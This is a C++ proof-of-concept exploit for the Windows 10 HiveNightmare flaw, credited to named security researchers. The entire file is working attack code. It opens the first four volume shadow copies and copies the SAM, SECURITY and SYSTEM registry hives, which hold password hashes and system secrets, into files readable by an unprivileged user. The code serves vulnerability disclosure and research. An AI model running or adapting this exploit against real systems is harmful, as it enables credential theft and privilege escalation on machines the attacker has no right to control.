// Exploit for HiveNightmare, discovered by @jonasLyk, PoC by @GossiTheDog, powered by Porgs
// Allows you to read SAM, SYSTEM and SECURITY registry hives in Windows 10 from non-admin users

// History
// 0.1 - 20/07/2021 - Initial version
// 0.2 - 20/07/2021 - Adds support for 4 snapshots
// 0.3 - 20/07/2021 - merge in support for SYSTEM and SECURITY dumping, various bug fixes
// 
// Bugs and issues
// - Dunno

#include <windows.h>
#include <stdio.h>
#include <iostream>

using std::endl;
using std::cout;

void main()
{
    printf("\nHiveNightmare - dump registry hives as non-admin users\n\nRunning...\n\n");

    HANDLE hFile;
    HANDLE hAppend;
    DWORD  dwBytesRead, dwBytesWritten, dwPos;
    BYTE   buff[4096];

    // Check out this mess, looks for VSC #1, #2, #3, #4 only.  Lolz.

    hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM"),GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 

    if (hFile == INVALID_HANDLE_VALUE)
    {
        hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\\config\\SAM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile == INVALID_HANDLE_VALUE)
        {
            hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\System32\\config\\SAM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

            if (hFile == INVALID_HANDLE_VALUE)
            {
                hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy4\\Windows\\System32\\config\\SAM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

                if (hFile == INVALID_HANDLE_VALUE)
                {
                    printf("Could not open SAM :( Is System Protection not enabled or vulnerability fixed?  Note currently hardcoded to look for first 4 VSS snapshots only - list snapshots with vssadmin list shadows\n");
                }
            }
        }
    }


    hAppend = CreateFile(TEXT("SAM-haxx"), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 

    if (hAppend == INVALID_HANDLE_VALUE)
    {
        printf("Could not write SAM-haxx - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to\n");
        return;
    }

    // Append the SAM file to the end of the second file.
    // We should probably overwrite it really.
    

    while (ReadFile(hFile, buff, sizeof(buff), &dwBytesRead, NULL)
        && dwBytesRead > 0)
    {
        dwPos = SetFilePointer(hAppend, 0, NULL, FILE_END);
        LockFile(hAppend, dwPos, 0, dwBytesRead, 0);
        WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
        UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
    }

    // Safety first.

    CloseHandle(hFile);
    CloseHandle(hAppend);

    cout << "SAM hive written out to current working directory" << endl;

    ///////////////////////////////////////////////
    // UPDATE PART 1: READ IN THE SECURITY HIVE TOO
    ///////////////////////////////////////////////
    hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\\config\\SECURITY"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile == INVALID_HANDLE_VALUE)
        {
            hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\System32\\config\\SECURITY"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

            if (hFile == INVALID_HANDLE_VALUE)
            {
                hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy4\\Windows\\System32\\config\\SECURITY"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

                if (hFile == INVALID_HANDLE_VALUE)
                {
                    printf("Could not open SECURITY :( Is System Protection not enabled or vulnerability fixed?  Note currently hardcoded to look for first 4 VSS snapshots only - list snapshots with vssadmin list shadows\n");
                    
                }
            }
        }
    }


    hAppend = CreateFile(TEXT("SECURITY-haxx"), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hAppend == INVALID_HANDLE_VALUE)
    {
        printf("Could not write SECURITY-haxx - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to");
        return;
    }

    // Append the SECURITY file to the end of the second file.
    // We should probably overwrite it really.


    while (ReadFile(hFile, buff, sizeof(buff), &dwBytesRead, NULL)
        && dwBytesRead > 0)
    {
        dwPos = SetFilePointer(hAppend, 0, NULL, FILE_END);
        LockFile(hAppend, dwPos, 0, dwBytesRead, 0);
        WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
        UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
    }

    // Safety first.

    CloseHandle(hFile);
    CloseHandle(hAppend);

    cout << "SECURITY hive written out to current working directory" << endl;

    ///////////////////////////////////////////////
    // UPDATE PART 1: READ IN THE SYSTEM HIVE TOO
    ///////////////////////////////////////////////
    hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\\config\\SYSTEM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile == INVALID_HANDLE_VALUE)
        {
            hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\System32\\config\\SYSTEM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

            if (hFile == INVALID_HANDLE_VALUE)
            {
                hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy4\\Windows\\System32\\config\\SYSTEM"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

                if (hFile == INVALID_HANDLE_VALUE)
                {
                    printf("Could not open SYSTEM :( Is System Protection not enabled or vulnerability fixed?  Note currently hardcoded to look for first 4 VSS snapshots only - list snapshots with vssadmin list shadows\n");

                }
            }
        }
    }


    hAppend = CreateFile(TEXT("SYSTEM-haxx"), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hAppend == INVALID_HANDLE_VALUE)
    {
        printf("Could not write SYSTEM-haxx - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to\n");
        return;
    }

    // Append the SECURITY file to the end of the second file.
    // We should probably overwrite it really.


    while (ReadFile(hFile, buff, sizeof(buff), &dwBytesRead, NULL)
        && dwBytesRead > 0)
    {
        dwPos = SetFilePointer(hAppend, 0, NULL, FILE_END);
        LockFile(hAppend, dwPos, 0, dwBytesRead, 0);
        WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
        UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
    }

    // Safety first.

    CloseHandle(hFile);
    CloseHandle(hAppend);

    cout << "SYSTEM hive written out to current working directory" << endl;

    cout << "Assuming no errors, should be able to find hive dump files in current working directory as SAM-haxx, SECURITY-haxx and SYSTEM-haxx" << endl;
}